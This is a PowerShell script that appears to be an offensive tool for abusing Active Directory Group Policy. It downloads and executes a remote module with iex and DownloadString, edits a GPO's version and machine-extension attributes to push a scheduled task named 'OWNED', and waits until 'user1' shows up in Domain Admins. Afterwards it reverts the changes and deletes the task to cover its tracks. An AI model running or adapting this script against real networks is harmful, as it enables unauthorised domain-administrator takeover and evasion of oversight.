[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
Import-ActiveDirectory
$guid = Read-Host "Enter GPO GUID (with {})"
$guid2 = "{"+$guid+"}"
$domain = (Get-ADDomain).Forest
$domaindn = (Get-ADDomain).DistinguishedName
$dc = (Get-ADDomain).InfrastructureMaster
if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
    $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
} else {
    $noext=1
}
$Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
$GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
echo "[+] Incrementing GPT.INI Version by 1"
$gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
$encoding = 'ASCII'
$gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
foreach ($s in $gptIniContent) {
    if($s.StartsWith("Version")) {
        $num = ($s -split "=")[1]
        $ver = [Convert]::ToInt32($num)
        $newVer = $ver + 1
        Write-Host $newver
        (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
            Set-Content -Encoding $encoding $gptIniFilePath -Force
    }
}
$currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
echo "[+] Current GPO AD versionNumber = $currentVersion"
echo "[+] Incrementing version by 1"
$newVersionValue = $currentVersion+1
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
$currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
echo "[+] GPO AD versionNumber = $currentVersion"
if($noext -ne 1){
    echo "[+] Current gPCMachineExtensionNames : $InitialExtensions"
} else {
    echo "[+] Current gPCMachineExtensionNames : <not set>"
}
echo "[+] Adding Extensions to the attribute"
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
$FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
if($FinalizedGPO.StartsWith("[{00000000")){echo "[+] Successfully written extensions to GPO!"}else{echo "[-] Nothing worked nevermind"}
echo "`n`n"
$timepassed = 0
while((Get-ADGroupMember "Domain Admins" | findstr user1) -eq $null){
    echo "Waiting for user to be added to the domain admins group."
    sleep 5; $timepassed+=5; echo "$timepassed seconds passed"
    }

echo "`n`n"
echo "[+] User added to the domain admins group!"
echo "[+] Reverting extensions back to what they were"
if($noext -ne 1){
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
} else {
    Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
}

if($noext -ne 1){
echo "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
} else {
    echo "[+] Cleared gPCMachineExtensionNames!"
}
echo "[+] Removing the scheduled task from the DC"
Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
echo "[+] Scheduled task removed!"
